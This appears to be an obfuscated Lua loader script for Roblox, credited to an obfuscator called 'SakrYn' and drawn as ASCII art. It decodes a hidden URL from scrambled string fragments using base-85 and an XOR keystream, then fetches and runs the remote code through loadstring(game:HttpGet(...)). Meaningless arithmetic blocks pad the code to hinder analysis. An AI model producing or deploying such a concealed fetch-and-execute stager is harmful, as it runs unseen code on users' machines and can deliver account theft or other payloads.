-- Obfuscated with SakrYn | ON TOP



                                          local b
                                        = {[2] =
                                     "?hJ", [9]
                                  = "..+D2", [
                                 14   ]     =
                               "7zm)b*", [7 ]
                             = "e:$", [15] =
                             "b8",  [ 6 ]  =
                             "5knn", [11] =
                             "v-6ne", [4] =
                             "bV^", [ 5]  =
                             "Jw54j-", [13]
                       =     "q1.zK3", [8 ]
                      =       "4(v4r", [1 ]
                      =       "O-QT4g", [3]
                     = "b/X"   ,  [ 10 ]  =
                     "PGUT",   [12] = "P6k5"
                     }; local   r =  "01234"
                     .."56789"   .."abcde"..
                     "fghij" ..   "klmno"  ..
                     "pqrst".."u"  .."vwxy" ..
                     "zABCD".."EF"  .."GHI".."JKL"
                     .."MN".."OPQRS"  .."TUVWX" ..            "YZ.-:"  ..
                     "+=^!/".. "*?&<>"  .. "(){}@"        .."%$#_|";  local
                      k = table.concat(b );  local     m =  {} ; local  c  =
                      32731; for x = 1, #k, 5 do local v = 0; for e = x, x  +
                        4 do v = v * 85 + string.find(r, k:sub(e, e), 1, true )
                           - 1; end;  for e = 3 , 0, -  1 do c =  (c * 86  +
                                46558) % 65521; m [#m + 1]  = string.char(bit32 .
                         bxor(math.floor(v/256^e) % 256, c % 256)); end; end; b =
                           table.concat(m ):sub(1 , 51);  local d, q  =
                            loadstring(game:HttpGet(b)); assert(d, q             )
                             ; do local u = {6, 9}; u[1] = u[2] % 3
                               ; end; do local u = {9, 3}; u[1] = u
                                 [2 ]  % 6; end; do local u = {7, 3}
                                     ; u[1] = u[2] % 3; end; local u
                                     = 1 % 1 % 5 % 3 % 1 + 4 % 7 % 5 +
                                          2 - 6 - 9 % 7 % 5 % 8 + 9 + 1
                                                - 4 - 6 + 3 - 8 - 2 %  2
                                                        % 2 % 9 + 9 + 3 -
                                                             7 % 6 - 5 +  7
                                                                - 3 + 7 + 1
                                                                   + 7 + 2 %
                                                                     9 -  6;
                                                                       return
                                                                           d(
                                                                           ...
                                                                             )

